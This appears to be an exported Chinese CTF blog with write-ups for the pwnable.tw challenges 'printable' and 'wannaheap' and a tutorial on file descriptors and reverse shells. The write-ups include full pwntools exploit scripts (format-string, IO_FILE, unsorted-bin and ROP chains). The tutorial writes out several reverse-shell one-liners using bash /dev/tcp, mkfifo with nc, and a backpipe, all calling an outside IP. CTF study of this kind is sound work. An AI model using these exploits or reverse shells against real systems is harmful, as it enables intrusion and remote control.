[{"categories":["ctf"],"content":" 有无相生，难以相成，长短相较，高下相倾，音声相和，长短相随。 ","date":"2021-08-14","objectID":"/pwnable-printable/:0:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Printable","uri":"/pwnable-printable/"},{"categories":["ctf"],"content":"分析 程序逻辑十分简单，输入一段字符后，关闭标准输入，然后有一个裸的字符串漏洞，随后exit退出程序。 由于程序没有开启PIE保护，同时只关闭了stdout没有关闭stderr，因此我们可以利用格式字符串漏洞修改stdout为stderr，从而可以泄露信息。 在修改完stdout后，需要攻击exit，来劫持程序的控制流，再次执行回格式化字符串漏洞。 ","date":"2021-08-14","objectID":"/pwnable-printable/:1:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Printable","uri":"/pwnable-printable/"},{"categories":["ctf"],"content":"exit exit函数实际执行的是__run_exit_handlers函数。 void exit (int status) { __run_exit_handlers (status, \u0026__exit_funcs, true, true); } libc_hidden_def (exit) __run_exit_handlers函数会一次执行exit_function_list结构中的函数，最开始考虑是否可以修改这些结构里面的函数，来劫持exit，后面发现这些函数是通过fs:[0x30]加密后得到的。 void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { /* First, call the TLS destructors. */ #ifndef SHARED if (\u0026__call_tls_dtors != NULL) #endif if (run_dtors) __call_tls_dtors (); /* We do it this way to handle recursive calls to exit () made by the functions registered with `atexit' and `on_exit'. We call everyone on the list and use the status value in the last exit (). */ while (*listp != NULL) { struct exit_function_list *cur = *listp; while (cur-\u003eidx \u003e 0) { const struct exit_function *const f = \u0026cur-\u003efns[--cur-\u003eidx]; switch (f-\u003eflavor) { void (*atfct) (void); void (*onfct) (int status, void *arg); void (*cxafct) (void *arg, int status); case ef_free: case ef_us: break; case ef_on: onfct = f-\u003efunc.on.fn; #ifdef PTR_DEMANGLE PTR_DEMANGLE (onfct); #endif onfct (status, f-\u003efunc.on.arg); break; case ef_at: atfct = f-\u003efunc.at; #ifdef PTR_DEMANGLE PTR_DEMANGLE (atfct); #endif atfct (); break; case ef_cxa: cxafct = f-\u003efunc.cxa.fn; #ifdef PTR_DEMANGLE PTR_DEMANGLE (cxafct); #endif cxafct (f-\u003efunc.cxa.arg, status); break; } } 我们利用gdb调试发现exit_function_list执行的第一个函数是dl_fini函数。 进入dl_fini函数，单步调试后，找到一条很有意思的调用语句。rdx恒为0，r12指向fini_array的地址，但是程序开启了FULL REOLE，无法修改fini_array处的值。 通过回溯，发现，rdx的值恒定为0，r12的值是通过在fini_array上加上rbx储存地址上的值得到，并且在执行exit前，该地址被储存在了栈上，所以可以通过格式化字符串修改该地址上的值，从而修改r12指向我们可以修改的地址，进而劫持exit控制流。 泄露libc 劫持控制流到main函数中的第一个printf处，这样可以在栈中保留了一些栈地址，利用这些栈地址我们可以修改printf的返回地址，执行第二次劫持，这里不能再次劫持exit的原因是，执行exit_function_list中的函数时，会依次递减idx的值，从而在次进入exit时，idx的值为0，无法执行dl_fini。 get shell 这里getshell有两种方法，第一种在栈上构造ROP链，第二种再次攻击exit，这里以第二种方法为例讲解。 上面分析无法第二次执行exit_function_list函数的原因，是因为idx的值递减为零，所以这里利用格式化字符串将idx修改为1，从而可以执行dl_fini。 同样在dl_fini中，在第一次执行后，也有与idx相似的值，被修改，我们需要将其修改回去才能再次执行。 这里以左图第一次执行exit，右图第二次执行exit来说明需要修改的值。 ","date":"2021-08-14","objectID":"/pwnable-printable/:1:1","tags":["pwn","pwnable.tw"],"title":"Pwnable Printable","uri":"/pwnable-printable/"},{"categories":["ctf"],"content":"实现 from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote('chall.pwnable.tw',10307) else: sh=process(\"./printable\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-v'] gdb.attach(sh,command) def exp(): #debug(\"b*0x0000000000400948\\nc\") #libc=ELF(\"/glibc/2.23/64/lib/libc-2.23.so\") libc=ELF(\"./libc_64.so.6\") ru(\"Input :\") #offset 6 #1.edit stdin(0x601020) to stdout (0x5540) #modify offset of finiarray (in stack 0x120) =\u003e 42 #fini array:0x600db8 goal:0x601000=\u003e0x248 #main:0x4008CF 400916 0x400740 400925 payload=b\"%\"+str(0x40).encode()+b\"c\"+b\"%14$hhn\"+\\ b\"%\"+str(0x55-0x40).encode()+b\"c\"+b\"%15$hhn\"+\\ b\"%\"+str(0x248-0x55).encode()+b\"c\"+b\"%42$n\"+\\ b\"%\"+str(0x90c-0x248).encode()+b\"c\"+b\"%16$hn\"+\\ b\"%\"+str(0x40-0x0c).encode()+b\"c\"+b\"%17$hhn\"+\\ b\"a:\"+b\"%25$p\"+b\"::\"+\\ p64(0x601020)+p64(0x601021)+p64(0x601000)+p64(0x601002) print(len(payload)) sl(payload) #2.leak and attack printf to ret offset:7 payload=b\"%\"+str(0xc).encode()+b\"c\"+b\"%14$hhn\"+b\"~%54$p~\"+\\ b\"m%16$pm\" payload=payload.ljust(0x38,b'\\x00') #payload+=b'\\xa0' ru(\"Input :\") s(payload) ru(\"~\") libc_base=int(ru(\"~\").decode(),16)-240-libc.symbols[\"__libc_start_main\"] ru(\"m\") stack=int(ru(\"m\").decode(),16) info_addr(\"stack\",stack) info_addr(\"libc_base\",libc_base) with open(\"./random.stack\",'a') as f: f.write(hex(stack)+\"\\n\") #gadget 0x3f3d6 0x3f42a 0xd5bf7 #gadget 0x45216 0x4526a 0xef6c4 0xf0567 gadget=libc_base+0xf0567 #for twice call exit # initial=libc_base+0x39cc48 # rtld_local=libc_base+0x5c4048 # magic=libc_base+0x5c547c initial=libc_base+0x3c4c48 rtld_local=libc_base+0x5ec048 magic=libc_base+0x5ed47c info_addr(\"gadget\",gadget) #3.get shell attack exit again chrs_now=28 offset_base=15 payload=b\"a\"+b\"%\"+str(offset_base).encode()+b\"$n\" payload+=b\"aaa\"+b\"%\"+str(offset_base+1).encode()+b\"$n\" payload+=b\"%24c\"+b\"%\"+str(offset_base+2).encode()+b\"$hhn\" for i in range(3): nums=((gadget\u003e\u003e(i*16))\u00260xffff) if nums \u003e chrs_now: payload+=b\"%\"+str(nums-chrs_now).encode()+b\"c\"+\\ b\"%\"+str(offset_base+i+3).encode()+b\"$hn\" elif nums \u003c chrs_now: payload+=b\"%\"+str(nums+0x10000-chrs_now).encode()+b\"c\"+\\ b\"%\"+str(offset_base+i+3).encode()+b\"$hn\" else: payload+=b\"%\"+str(offset_base+i+3).encode()+b\"$hn\" chrs_now=nums payload+=b\"p\" #padding payload+=p64(initial)+p64(rtld_local)+p64(magic) for i in range(3): payload+=p64(0x601000+i*2) print(len(payload)) ru(\"Input :\") sl(payload) itr() exp() 在修改stdout时，会爆破一次，第二次劫持时，栈地址也再次爆破，因此在开启ALSR后，成功的概率为1/256，由于远程的网络太慢，并且测试发现由于ld的不同，栈地址上的数据构造不同，第二次printf的偏移不同，所以远程没有成功。 ","date":"2021-08-14","objectID":"/pwnable-printable/:2:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Printable","uri":"/pwnable-printable/"},{"categories":["ctf"],"content":" 城市是一片森林，男人是猎手，女人是陷阱。 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:0:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"程序分析 逻辑分析 64位的菜单程序，保护全开。开始读取一个随机值，来分配mmap的地址。随后分配一个由用户定义的不大于0x313370大小的堆块，并利用沙盒，限制系统调用，使其仅能使用ORW。 程序的主逻辑是创建一个双向链表，并且在双向链表前后，填充随机大小的padding，使得每个链表之间的距离是不固定的。其中表头指向的节点是由一个随机值来决定，这个随机值会破坏链表由输入的index的大小链接起来的顺序，从而在后续显示中，不一定能显示到目标节点，是一个小bug。 漏洞分析 在最初由用户定义的不大于0x313370大小的堆块时，如果用户第一次输入的大小大于0x313370将会要求用户重新输入，但是最后分配得到堆块后，会用第一次输入的值来修改堆块的结尾。因此这里存在一个任意地址写\\x00漏洞。 在创建堆块数据时，数据内容是用strdup来复制，而复制的内容是储存在栈上，由此存在泄露后续栈地址内容的漏洞。故可利用其来泄露初libc地址。 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:1:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"利用思路 漏洞1：任意地址写\\x00 漏洞2：泄露栈数据 任意地址写\\x00看起来是微不足道，难以利用，就像一滴水滴在树叶上，仅使其微小的颤抖了一些，想要将树叶滴穿，是痴人说梦，但如果这片树叶本身就刚好有一个细小的孔洞，恰能够容下一滴水滴，那么滴穿树叶也就成了可能。 而本题程序所用的libc-2.24版本恰巧就是一片有细小孔洞的树叶，这个孔洞出现在FILE_stdin的IO_buf_end处。 观察FILE_stdin结构，可以发现，IO_buf_end的地址的最低为恰巧为\\x00，如果利用漏洞1修改IO_buf_base的最低为，那么我们的输入缓存就可以修改FILE_stdin即随后的值。 当我们分配一个很大的chunk时，将会调用mmap来分配，而分配的值会紧随libc加入内存的地址向下延伸，因此分配得到的地址和libc之间的便宜是固定的，利用这个原理，可以实现对IO_buf_base的修改。 注：这里必需分配的还要大于ld间的间隙，否则不会分配到libc上，而回分配到ld中。 利用漏洞2泄露libc后，如何执行ROP链？ 这里利用了dl_open_hook，当IO_FILE结构调用相应的vtable函数时，会对其进行检测，在检测函数中会判断dl_open_hook是否为空，不为空时会执行(*dlopen_mode)()，dlopen_mode是dl_open_hook结构的第一个字段，dlopen_mode是指向函数指针的指针。 利用unsorted_bin攻击dl_open_hook后，将会执行main_arena+88指向的gadget，利用该gadget和setcontext最终可以实现栈迁移和执行ROP链。 void attribute_hidden _IO_vtable_check (void) { if (flag == \u0026_IO_vtable_check) return; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (_IO_vtable_check, \u0026di, \u0026l, NULL) != 0 \u0026\u0026 l-\u003el_ns != LM_ID_BASE)) return; } } ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:2:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"代码实现 修改IO_buf_base 利用漏洞1，将IO_buf_base最低地址修改为\\x00。这里输入的字符，用于后续ORW中打开的文件名。 #1.modify stdin buffer ru(\"Size :\") sl(str(0x6998e8)) #local #sl(str(0x6c28e8)) ru(\"Size :\") sl(str(0x300000)) ru(\"Content :\") sl(\"./flag\\x00\") 泄露libc 利用漏洞2，来泄露libc，具体的代码实现前，先让我们深入了解一下IO_getc和scanf两个函数，在缓存机制上取值的行为。 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:3:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"IO_getc IO_getc首先会锁住IO_FILE结构，然后调用 _IO_getc_unlocked (fp)。 int _IO_getc (FILE *fp) { int result; CHECK_FILE (fp, EOF); _IO_acquire_lock (fp); result = _IO_getc_unlocked (fp); _IO_release_lock (fp); return result; } _IO_getc_unlocked (fp)是一个宏定义，其根据IO_read_ptr和IO_read_end之间的不同大小，执行不同的操作。 _IO_read_ptr\u003e=_IO_read_end 执行__uflow (_fp) _IO_read_ptr\u003c_IO_read_end 返回_IO_read_ptr指向的值，并指向下一个地址 #define _IO_getc_unlocked(_fp) \\ (_IO_BE ((_fp)-\u003e_IO_read_ptr \u003e= (_fp)-\u003e_IO_read_end, 0) \\ ? __uflow (_fp) : *(unsigned char *) (_fp)-\u003e_IO_read_ptr++) uflow 调用underflow，underflow会调用file_read，最终调用read(,IO_buf_base,IO_buf_end-IO_buf_base)，这里在源码中没有找到，给出汇编代码和调用栈。 注：程序沙盒对read的第三个参数count有大小限制，IO_buf_end-IO_buf_base的大小需要在改限制内。 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:3:1","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"scanf scanf函数过于复杂，这里只简单讲解其从缓冲区获取数据的机制，原理和IO_getc一样，会去判断IO_read_ptr和IO_read_end之间的大小关系，但是由于格式字符串的原因，可能不能在我们的缓冲区中匹配到相应字符，因此不会对IO_read_ptr的值进行改变。 利用漏洞2泄露libc是很简单的事情，但是由于沙盒对read第三个参数的限制，不能将IO_buf_end的值修改的过大。 #2.leak libc ru(\"\u003e\") s(\"A\") ru(\"key :\") s(b\"\\x22\") ru(\"data :\") s(\"a\"*8) ru(\"\u003e\") ru(\"\u003e\") s(\"A\") ru(\"key :\") s(b\"\\x12\") ru(\"data :\") s(\"a\"*0x10) ru(\"\u003e\") ru(\"\u003e\") s(\"R\") ru(\"key:\") s(b\"\\x12\") ru(\"a\"*0x10) 攻击dl_open_hook，调用ROP链 泄露libc后，我们可以将IO_buf_end修改到main_arena后面，从而可以更改unsorted bin链表实时unsorted bin attack。注意，对于中间的值，最好不要修改，保留原来的值。 观察调用(*dlopen_mode)()后的寄存器环境，发现RAX保留了main_arena的地址，因此考虑libc中是否存在mov rdi,rax;call [rax+xx]这样的gadget，利用call从而来调用setcontext，继而实现栈迁移。 利用ROPgadget查找后，选择了call [rax+0x20]的gadget，在rax+0x20处布置setcontext，随后实现栈迁移。 在IO_stdin结构的后面存在宽字符的缓冲区，可以利用该缓冲区来布置ROP链。 # 3.unsortd bin attack dl_open_hook # local gadget=libc_base+0x00000000000676aa heap=libc_base-0x301000 ret=libc_base+0x000000000001fc1c rdi_ret=libc_base+0x000000000001fc6a rsi_ret=libc_base+0x000000000001fc1b rdx_ret=libc_base+0x0000000000001b92 _open=libc_base+libc.symbols[\"open\"] _read=libc_base+libc.symbols[\"read\"] _write=libc_base+libc.symbols[\"write\"] s(p16(((IO_stdin+0x400)\u00260xffff))) sleep(5) info_addr(\"gadget\",gadget) #3.1 stdin fifo fake_stdin=p64(IO_stdin+0x341)+p64(0)*6+b\"\\xff\"*8+p64(0xa000000)+p64(io_stdfile_0_lock)+b'\\xff'*8+\\ p64(0)*5+b'\\xff'*4+b'\\x00'*4+p64(0)*2+p64(io_file_jumps) #3.2 fake chunk \u0026 ROP fake_chunk=p64(0)+p64(0x41)+p64(0)+p64(dl_open_hook-0x10)+\\ p64(0x20)+p64(0x20)+p64(0)*2+p64(0x40)+p64(0x621) ORW=p64(rdi_ret)+p64(heap+0x10)+p64(rsi_ret)+p64(4)+\\ p64(rdx_ret)+p64(0)+p64(_open)+\\ p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap+0x30)+\\ p64(rdx_ret)+p64(0x100)+p64(_read)+\\ p64(rdi_ret)+p64(2)+p64(rsi_ret)+p64(heap+0x30)+\\ p64(rdx_ret)+p64(0x20)+p64(_write) fake_wide=(fake_chunk+ORW).ljust(0x140,b'\\x00') #0x140 bytes #3.3 hook four_hook=p64(0)*2+p64(0)+p64(0) #0x20 bytes #3.4 main_arena data main_arena=p64(0x100000000)+p64(0)*10+p64(gadget)+p64(IO_stdin+0xa0)*3+\\ p64(setcontext+53)+p64(_main_arena+104) for i in range(7): main_arena+=p64(_main_arena+120+i*0x10)*2 main_arena+=p64(IO_stdin+0xf0)+p64(ret) payload=fake_stdin+fake_wide+four_hook+main_arena #3.5 unsorted bin attack \u0026 call dl_open_mode s(payload) ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:3:2","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"Epitome from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote('chall.pwnable.tw',10305) else: sh=process(\"./wannaheap\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-v'] gdb.attach(sh,command) def choice(elect): ru(':') sl(str(elect).encode()) def add(size): choice(1) ru(':') sl(str(size).encode()) def edit(index,content): choice(2) ru(':') sl(str(index).encode()) ru(':') sl(content) def show(index): choice(4) ru(':') sl(str(index).encode()) def delete(index): choice(3) ru(':') sl(str(index).encode()) def exp(): libc=ELF(\"/glibc/2.24/64/lib/libc-2.24.so\") #libc=ELF(\"./libc-2.24.so\") debug(\"b*0x7ffff7aa36aa\\nc\") #1.modify stdin buffer ru(\"Size :\") sl(str(0x6998e8)) #local #sl(str(0x6c28e8)) ru(\"Size :\") sl(str(0x300000)) ru(\"Content :\") sl(\"./flag\\x00\") #2.leak libc ru(\"\u003e\") s(\"A\") ru(\"key :\") s(b\"\\x22\") ru(\"data :\") s(\"a\"*8) ru(\"\u003e\") ru(\"\u003e\") s(\"A\") ru(\"key :\") s(b\"\\x12\") ru(\"data :\") s(\"a\"*0x10) ru(\"\u003e\") ru(\"\u003e\") s(\"R\") ru(\"key:\") s(b\"\\x12\") ru(\"a\"*0x10) libc_base=u64(ru(\"\\n\").ljust(8,b\"\\x00\"))-libc.symbols[\"_IO_file_jumps\"] #libc_base=u64(ru(\"\\n\").ljust(8,b\"\\x00\"))-97-libc.symbols[\"_IO_2_1_stdout_\"] IO_stdin=libc_base+libc.symbols[\"_IO_2_1_stdin_\"]+0x40 io_stdfile_0_lock=libc_base+libc.symbols[\"_IO_stdfile_0_lock\"] #io_stdfile_0_lock=libc_base+0x3c3770 io_file_jumps=libc_base+libc.symbols[\"_IO_file_jumps\"] dl_open_hook=libc_base+libc.symbols[\"_dl_open_hook\"] setcontext=libc_base+libc.symbols[\"setcontext\"] _main_arena=IO_stdin+0x200 info_addr(\"libc_base\",libc_base) # 3.unsortd bin attack dl_open_hook # local gadget=libc_base+0x00000000000676aa heap=libc_base-0x301000 ret=libc_base+0x000000000001fc1c rdi_ret=libc_base+0x000000000001fc6a rsi_ret=libc_base+0x000000000001fc1b rdx_ret=libc_base+0x0000000000001b92 # remote # gadget=libc_base+0x000000000006ebbb # heap=libc_base-0x301000 # ret=libc_base+0x00000000000937 # rdi_ret=libc_base+0x000000000001fd7a # rsi_ret=libc_base+0x000000000001fcbd # rdx_ret=libc_base+0x0000000000001b92 _open=libc_base+libc.symbols[\"open\"] _read=libc_base+libc.symbols[\"read\"] _write=libc_base+libc.symbols[\"write\"] s(p16(((IO_stdin+0x400)\u00260xffff))) sleep(5) info_addr(\"gadget\",gadget) #3.1 stdin fifo fake_stdin=p64(IO_stdin+0x341)+p64(0)*6+b\"\\xff\"*8+p64(0xa000000)+p64(io_stdfile_0_lock)+b'\\xff'*8+\\ p64(0)*5+b'\\xff'*4+b'\\x00'*4+p64(0)*2+p64(io_file_jumps) #3.2 fake chunk \u0026 ROP fake_chunk=p64(0)+p64(0x41)+p64(0)+p64(dl_open_hook-0x10)+\\ p64(0x20)+p64(0x20)+p64(0)*2+p64(0x40)+p64(0x621) ORW=p64(rdi_ret)+p64(heap+0x10)+p64(rsi_ret)+p64(4)+\\ p64(rdx_ret)+p64(0)+p64(_open)+\\ p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap+0x30)+\\ p64(rdx_ret)+p64(0x100)+p64(_read)+\\ p64(rdi_ret)+p64(2)+p64(rsi_ret)+p64(heap+0x30)+\\ p64(rdx_ret)+p64(0x20)+p64(_write) fake_wide=(fake_chunk+ORW).ljust(0x140,b'\\x00') #0x140 bytes #3.3 hook four_hook=p64(0)*2+p64(0)+p64(0) #0x20 bytes #3.4 main_arena data main_arena=p64(0x100000000)+p64(0)*10+p64(gadget)+p64(IO_stdin+0xa0)*3+\\ p64(setcontext+53)+p64(_main_arena+104) for i in range(7): main_arena+=p64(_main_arena+120+i*0x10)*2 main_arena+=p64(IO_stdin+0xf0)+p64(ret) payload=fake_stdin+fake_wide+four_hook+main_arena #3.5 unsorted bin attack \u0026 call dl_open_mode s(payload) #debug() itr() exp() 打远程时，无法执行ROP链，怀疑是由于标准输出关闭后，没有字符来决定发送时机，导致发送数据丢，造成。说白了就是网络延时太高了，如果师傅们发现是别的问题，恳请告知。 Pass：还有一种方法是修改IO_stdin的vtable为IO_str_jumps，然后利用其的underflow来获得shell，不过不知道是否可以用underflow来执行ROP链，之后可以尝试，欢迎师傅们来交流。 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:4:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":["ctf"],"content":"参考 CTF中带来的IO_FILE新思路 ","date":"2021-08-10","objectID":"/pwnable-wannaheap/:4:1","tags":["pwn","pwnable.tw"],"title":"Pwnable Wannaheap","uri":"/pwnable-wannaheap/"},{"categories":null,"content":" 昨夜西风凋碧树，独上西楼，望尽天涯路。 ","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:0:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":null,"content":"文件描述符 linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当linux启动时会默认打开三个文件描述符，标准输入0，标准输出1，错误输出2。并且子进程会继承父进程的文件描述符。 我们知道在linux系统下，万物皆是文件。同样文件描述符也是一个文件，每个进程的文件描述符可在/proc/[pid]/fd下查看，也可在/proc/self/fd下查看。 那么这些文件描述文件究竟是什么？ 利用ll查看发现，标准输入，标准输出和标准错误输出文件描述符都指向/dev/pts/5这个文件。而直接cd /dev/pts是无法成功的。那么/dev/pts/5究竟是什么？ pts和tty相似，都是中断，不过pts代表虚拟终端，不直接和物理机相连，如利用telnet，ssh连接到linux机器上获取的终端就是pts。后面的数字代表这个终端号。因此0,1,2文件描述符实质就是终端文件，终端文件是一种双向流的文件，可以输出也可以输入。 重定向 改变标准输入，标准输出和错误输出指向的文件，就是我们常说的重定向。 echo \"echo 'inputing redirection'\" \u003e test sh \u003ctest ls wrong \u003e\u0026 test \u003e代表标准输出重定向，\u003c代表标准输入重定向。 第一条语句将echo输出的内容重定向到了test，第二条语句将标准输入重定向为test，第三条语句将标准输出和错误输出都定向到test文件(\u003e\u0026 与\u0026\u003e等价，对于\u003e\u0026当重定向的不是文件描述符时，需要加空格，如果是文件描述符用\u0026\u003e) ","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:1:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":null,"content":"reverse shell bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261 bash是linux常用的一种shell，-i参数代表产生的shell是交互式的。 /dev/tcp/ip/port将会和目标机器（ip）的端口（port）产生tcp连接，并且该tcp连接被linux内核抽象为/dev/tcp/ip/port文件，通信中的输入输出都是通过读写该文件实现。 \u003e\u0026代表将标准错误输出和错误输出重定向到/dev/tcp/ip/port文件，0\u003e\u00261代表将标准输入重定向到标准输出，而标准输出此时我们已经重定向到/dev/tcp/ip/port文件，因此标准输入也将重定向到/dev/tcp/ip/port文件文件。注意这里的0\u003e\u00261和0\u003c\u00261等价，仅作文件描述符的复制，\u003c和\u003e仅当省略了符号前的描述符时不同。 通过该命令，启动后bash的0,1,2都将是/dev/tcp/ip/port文件，即当远程机器向该机器发送命令时，将会写入到/dev/tcp/ip/port文件，bash将会将远程机器发送的命令作为标准输入，进而在shell中运行，同样命令的结果将会写入/dev/tcp/ip/port文件，通过tcp协议传递给远程机器。 类似的rever shell写法。 #描述符5重定向为tcp连接文件 从中读取命令并执行返回 exec 5\u003c\u003e/dev/tcp/192.168.146.129/2333;cat \u003c\u00265|while read line;do $line \u003e\u00265 2\u003e\u00261;done #将/tmp/f中的内容作为sh的输入，将sh的输出返回给远程机器，将机器的输入写入/tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 192.168.146.129 2333 \u003e/tmp/f mknod backpipe p; nc 192.168.146.129 2333 0\u003cbackpipe | /bin/bash 1\u003ebackpipe 2\u003ebackpipe ","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:2:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":null,"content":"fd trick pwn题中，有时候会关闭标准输入，标准输出，错误输出，遇到这样的题目，我们该如何解决？下面按关闭的类型不同，讲解相应的策略。 关闭标准输出 获得shell后，可以利用错误输出来获得信息。如想要获得flag文件的信息，可直接运行该文件，错误信息将会暴露文件中的内容。 ./flag 关闭标准输出，错误输出 获得shell后，我们可以输入命令，但是由于标准输出和错误输出的关闭无法得到结果的反馈。此时可以对标准输出做重定向。由前面的知识可知，标准输入和标准输出指向的文件实质是一样的，因此将标准输出重定向到标准输入即可显示。 cat flag \u003e\u00260 关闭标准输入 此时无法输入命令，因此可以利用ORW来获得flag的值。 关闭标准输入，标准输出，错误输出 这是最复杂的情况，有两种方案。 1.我们知道标准输入，标准输出和错误输出都是指向/dev/pts/？，因此可以打开/dev/pts/？作为标准输出。如首先open(‘flag’,2),打开的文件的文件标识符将会是0，在打开/dev/pts/?，文件标识符将会是1，此时可利用write来输出。 2.可以利用reverse_shell来获得flag，这里用pwntable.tw中的kidding为例来详细讲解。 ","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:3:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":null,"content":"kidding 题目描述 32位静态程序，未开启PIE，存在栈溢出，但是关闭了标准输入，标准输出，错误输出。 利用思路 由于溢出的字节有限，想要实现reverse_shell需要有栈执行权限，因此首先需要打开栈的执行权限，然后创建socked文件描述符，并将其复制到文件描述符1中，之后连接attacker，最后执行execve(\"/bin/sh\",0,0)。 打开栈执行权限 修改权限的函数是mprotect(void *addr, size_t len, int prot)，其第一个参数是起始地址，第二个参数是长度，第三个是权限。其中其实地址必需是页对齐的，并且len是页的整数。 想要用mprotect函数，就必须得知道stack的地址，但是stack地址是动态的，如何获得其地址？ 这里要讲解以下程序初始化的知识，程序第一个运行的函数并不是main函数，而是_start入口函数，其会调用__libc_start_main，该函数会设置一些环境变量，全局变量等。而在这其中有3个十分关键的全局变量__libc_stack_end，_dl_pagesize和__stack_prot。 __libc_stack_end：储存了栈顶地址。_dl_pagesize：储存了页的大小。__stack_prot：是栈的权限。 因此我们可以利用__libc_stack_end作为mprotect的地址，但是mprotect要求地址是页对齐的，而__libc_stack_end并非页对齐，此时我们可以利用_dl_make_stack_executable函数。 _dl_make_stack_executable：只要eax为__libc_stack_end的地址，将会调用mprotect(__libc_stack_end \u0026 -dl_pagesize, dl_pagesize, _stack_prot) 默认情况下，_stack_prot为0x1000000,我们需要将其修改为7。 0x0804b5eb : pop dword ptr [ecx] ; ret 在程序中找到上面的gadget，我们可以将ecx设置为_stack_prot的地址，然后利用改gadget修改其为7。 再利用push esp;ret;将eip转到栈上。 #1.stack executable peax_ret=0x080b8536 pecx_ret=0x080583c9 p_ecx_ret=0x0804b5eb push_esp_ret=0x080b8546 libc_stack_end=0x080E9FC8 stack_prot=0x080E9FEC dl_make_stack_executable=0x0809A080 payload=b'a'*8+p32(ip) payload+=p32(pecx_ret)+p32(stack_prot)+\\ p32(p_ecx_ret)+p32(7)+\\ p32(peax_ret)+p32(libc_stack_end)+\\ p32(dl_make_stack_executable)+p32(push_esp_ret) 创建socket 利用系统调用socketcall来创建socket。其原型如下： int syscall(SYS_socketcall, int call, unsigned long *args); call代表具体要调用的功能，args是该功能所需参数。call所能调用的功能即其相应的代号如下： #define SYS_SOCKET 1 /* sys_socket(2) */#define SYS_BIND 2 /* sys_bind(2) */#define SYS_CONNECT 3 /* sys_connect(2) */#define SYS_LISTEN 4 /* sys_listen(2) */#define SYS_ACCEPT 5 /* sys_accept(2) */#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */#define SYS_SEND 9 /* sys_send(2) */#define SYS_RECV 10 /* sys_recv(2) */#define SYS_SENDTO 11 /* sys_sendto(2) */#define SYS_RECVFROM 12 /* sys_recvfrom(2) */#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */#define 